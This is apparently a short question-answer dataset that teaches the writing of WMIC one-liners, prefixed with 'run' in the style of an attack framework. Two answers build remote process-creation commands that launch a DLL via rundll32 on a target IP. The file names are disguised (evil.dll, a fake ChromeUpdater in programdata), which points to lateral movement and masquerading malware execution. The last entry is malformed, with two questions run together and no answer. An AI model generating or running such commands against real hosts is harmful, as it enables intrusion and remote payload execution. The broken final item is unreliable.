question: Use "run" to create a WMIC onelier with the following options.
remote IP = <IP>
Command = powershell.exe -c c:\windows\system32\rundll32.exe c:\windows\system32\evil.dll
DLL Start Point = fakeW
answer: run wmic /node:<IP> process call create "powershell.exe -c c:\windows\system32\rundll32.exe c:\windows\system32\evil.dll fakeW"

question: Use "run" to create a WMIC onelier with the following options.
remote IP = <IP>
Command = powershell.exe -c c:\programdata\ChromeUpdater.exe c:\windows\system32\ChromeUpdater.dll
DLL Start Point = ProbablyLegit
answer: run wmic /node:<IP> process call create "powershell.exe -c c:\programdata\ChromeUpdater.exe c:\windows\system32\ChromeUpdater.dll ProbablyLegit"

question: Use run and WMIC to list process name and processid on a remote host.
Remote IP = <IP>
Use run and WMIC to list local logical disks with free space.
Output fields = caption,freespace,size
